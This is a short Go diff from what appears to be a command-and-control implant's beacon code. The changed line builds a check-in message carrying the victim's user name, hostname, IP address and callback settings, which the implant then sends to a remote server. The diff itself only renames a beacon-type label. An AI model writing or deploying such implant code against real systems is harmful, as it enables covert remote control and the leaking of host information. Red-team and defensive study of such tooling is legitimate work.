@@ -117,7 +117,7 @@ func main() {
 		}
 		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
 		ip := fmt.Sprintf("%v", ipAddress)
-		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":KeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter + ":MASTERKEY"
+		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":NoKeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter + ":MASTERKEY"
 		logger.Logf(logger.Debug, "Sending : %s\n", init)
 		_, _ = beacon.Write([]byte(init + "\n"))
 		dec := gob.NewDecoder(beacon)
